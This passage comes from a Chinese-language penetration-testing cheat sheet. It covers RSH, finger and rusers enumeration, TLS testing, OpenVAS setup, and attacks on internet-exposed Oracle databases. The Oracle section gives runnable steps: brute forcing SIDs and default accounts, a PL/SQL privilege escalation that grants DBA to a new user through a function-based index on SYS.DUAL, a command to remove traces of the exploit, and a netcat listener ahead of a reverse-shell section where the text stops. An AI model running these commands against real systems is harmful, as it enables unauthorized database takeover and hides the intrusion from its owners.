</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
</span></span></code></pre></td></tr></table></div></div><h4 id=远程服务枚举>远程服务枚举<a hidden class=anchor aria-hidden=true href=#远程服务枚举>#</a></h4><p>这已是老生常谈，但为了本文内容的全面还是包含如下。</p><p><code>nmap -A</code> 会进行下面列举的所有远程服务的枚举，所以这里只是顺便提及。</p><h5 id=rsh-枚举>RSH 枚举<a hidden class=anchor aria-hidden=true href=#rsh-枚举>#</a></h5><h6 id=rsh运行命令>RSH运行命令<a hidden class=anchor aria-hidden=true href=#rsh运行命令>#</a></h6><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>rsh &lt;target&gt; &lt;command&gt;
</span></span></code></pre></td></tr></table></div></div><h6 id=metasploitrsh-登陆扫描>MetasploitRSH 登陆扫描<a hidden class=anchor aria-hidden=true href=#metasploitrsh-登陆扫描>#</a></h6><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-29-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-29-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>auxiliary/scanner/rservices/rsh_login
</span></span></code></pre></td></tr></table></div></div><h6 id=使用rusers显示已登陆用户>使用rusers显示已登陆用户<a hidden class=anchor aria-hidden=true href=#使用rusers显示已登陆用户>#</a></h6><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-30-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-30-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>rusers -al 192.168.2.1
</span></span></code></pre></td></tr></table></div></div><h6 id=使用rlogin扫描整个子网>使用rlogin扫描整个子网<a hidden class=anchor aria-hidden=true href=#使用rlogin扫描整个子网>#</a></h6><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>rlogin -l &lt;user&gt; &lt;target&gt;
</span></span><span style=display:flex><span>e.g rlogin -l root TARGET-SUBNET/24
</span></span></code></pre></td></tr></table></div></div><h4 id=使用finger枚举>使用finger枚举<a hidden class=anchor aria-hidden=true href=#使用finger枚举>#</a></h4><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-32-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-32-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-32-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-32-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>finger @TARGET-IP
</span></span><span style=display:flex><span>finger batman@TARGET-IP 
</span></span></code></pre></td></tr></table></div></div><h5 id=利用solaris的bug显示所有已登录用户>利用Solaris的bug显示所有已登录用户<a hidden class=anchor aria-hidden=true href=#利用solaris的bug显示所有已登录用户>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-6>6</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>finger 0@host  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>SunOS: RPC services allow user enum:
</span></span><span style=display:flex><span>$ rusers # users logged onto LAN
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>finger &#39;a b c d e f g h&#39;@sunhost 
</span></span></code></pre></td></tr></table></div></div><h4 id=rwho>rwho<a hidden class=anchor aria-hidden=true href=#rwho>#</a></h4><p>使用nmap识别运行rwhod服务（513端口，UDP协议）的机器。</p><h2 id=tlsssl-测试>TLS&amp;SSL 测试<a hidden class=anchor aria-hidden=true href=#tlsssl-测试>#</a></h2><h3 id=testsslsh>testssl.sh<a hidden class=anchor aria-hidden=true href=#testsslsh>#</a></h3><p>测试单一主机并将结果输出的HTML文件：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST | aha &gt; OUTPUT-FILE.html  
</span></span></code></pre></td></tr></table></div></div><h2 id=漏洞评估>漏洞评估<a hidden class=anchor aria-hidden=true href=#漏洞评估>#</a></h2><p>在Kali Rolling上安装OpenVAS 8</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>apt-get update
</span></span><span style=display:flex><span>apt-get dist-upgrade -y
</span></span><span style=display:flex><span>apt-get install openvas
</span></span><span style=display:flex><span>openvas-setup
</span></span></code></pre></td></tr></table></div></div><p>确认openvas 正在运行：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-36-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-36-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>netstat -tulpn
</span></span></code></pre></td></tr></table></div></div><p>通过<code>https://127.0.0.1:9392</code> 登陆openvas，密码是在安装时设置好的。</p><h2 id=数据库渗透测试>数据库渗透测试<a hidden class=anchor aria-hidden=true href=#数据库渗透测试>#</a></h2><p>攻击暴露在互联网上的数据库。</p><h3 id=oracle>Oracle<a hidden class=anchor aria-hidden=true href=#oracle>#</a></h3><p>安装 oscanner：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-37-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-37-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>apt-get install oscanner  
</span></span></code></pre></td></tr></table></div></div><p>运行 oscanner：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-38-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-38-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>oscanner -s 192.168.1.200 -P 1521 
</span></span></code></pre></td></tr></table></div></div><h4 id=oracle-tns版本指纹识别>Oracle TNS版本指纹识别<a hidden class=anchor aria-hidden=true href=#oracle-tns版本指纹识别>#</a></h4><p>安装 tnscmd10g ：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>apt-get install tnscmd10g
</span></span></code></pre></td></tr></table></div></div><p>识别：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>tnscmd10g version -h TARGET
</span></span><span style=display:flex><span>nmap --script=oracle-tns-version 
</span></span></code></pre></td></tr></table></div></div><h4 id=爆破oracle账户>爆破Oracle账户<a hidden class=anchor aria-hidden=true href=#爆破oracle账户>#</a></h4><p>验证默认账户</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span> nmap --script=oracle-sid-brute 
</span></span><span style=display:flex><span> nmap --script=oracle-brute 
</span></span></code></pre></td></tr></table></div></div><p>对Oracle TNS 运行nmap脚本：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>nmap -p 1521 -A TARGET
</span></span></code></pre></td></tr></table></div></div><h4 id=oracle权限提升>Oracle权限提升<a hidden class=anchor aria-hidden=true href=#oracle权限提升>#</a></h4><p>利用条件：</p><ul><li>Oracle必须暴露在互联网上</li><li>使用默认账户，如scott</li></ul><p>简明流程：</p><ul><li>创建函数</li><li>创建表 SYS.DUAL 的索引</li><li>刚刚建立的索引执行了SCOTT.DBA_X 函数</li><li>函数是被SYS用户执行的，因为表 SYS.DUAL 属于SYS用户</li><li>创建具有DBA权限的账户</li></ul><p>下面的展示使用SCOTT用户，但其他默认的Oracle用户也是可以的。</p><h5 id=使用nmap-nse脚本验证oracle数据库中的默认账户>使用NMAP NSE脚本验证oracle数据库中的默认账户：<a hidden class=anchor aria-hidden=true href=#使用nmap-nse脚本验证oracle数据库中的默认账户>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>nmap --script=oracle-sid-brute 
</span></span><span style=display:flex><span>nmap --script=oracle-brute 
</span></span></code></pre></td></tr></table></div></div><p>使用脆弱账号登陆（假设你发现了一个）。</p><h5 id=确认一个oracle用户的权限级别>确认一个oracle用户的权限级别<a hidden class=anchor aria-hidden=true href=#确认一个oracle用户的权限级别>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-44-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-44-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-44-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-44-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-44-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-44-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-44-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-44-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-44-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-44-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-44-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-44-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-44-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-44-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-44-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-44-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-44-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-44-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-44-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-44-10>10</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>SQL&gt; select * from session_privs; 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>SQL&gt; CREATE OR REPLACE FUNCTION GETDBA(FOO varchar) return varchar deterministic authid 
</span></span><span style=display:flex><span>curren_user is 
</span></span><span style=display:flex><span>pragma autonomous_transaction; 
</span></span><span style=display:flex><span>begin 
</span></span><span style=display:flex><span>execute immediate &#39;grant dba to user1 identified by pass1&#39;;
</span></span><span style=display:flex><span>commit;
</span></span><span style=display:flex><span>return &#39;FOO&#39;;
</span></span><span style=display:flex><span>end;
</span></span></code></pre></td></tr></table></div></div><h5 id=oracle权限提升和访问dba>Oracle权限提升和访问DBA<a hidden class=anchor aria-hidden=true href=#oracle权限提升和访问dba>#</a></h5><p>运行netcat，<code>netcat -nvlp 443</code> 。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>SQL&gt; create index exploit_1337 on SYS.DUAL(SCOTT.GETDBA(&#39;BAR&#39;));
</span></span></code></pre></td></tr></table></div></div><h5 id=运行查询语句>运行查询语句<a hidden class=anchor aria-hidden=true href=#运行查询语句>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-46-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-46-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>SQL&gt; Select * from session_privs; 
</span></span></code></pre></td></tr></table></div></div><p>这时你应该拥有一个DBA用户，可以重新运行上面的命令来验证自己是否拥有DBA特权。</p><h5 id=移除利用痕迹>移除利用痕迹：<a hidden class=anchor aria-hidden=true href=#移除利用痕迹>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-47-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-47-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>drop index exploit_1337; 
</span></span></code></pre></td></tr></table></div></div><h5 id=获取oracle反弹shell>获取Oracle反弹shell：<a hidden class=anchor aria-hidden=true href=#获取oracle反弹shell>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-48-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-48-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-48-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-48-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-48-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-48-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-48-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-48-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-48-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-48-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-48-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-48-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-48-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-48-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-48-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-48-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-48-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-48-9> 9</a>
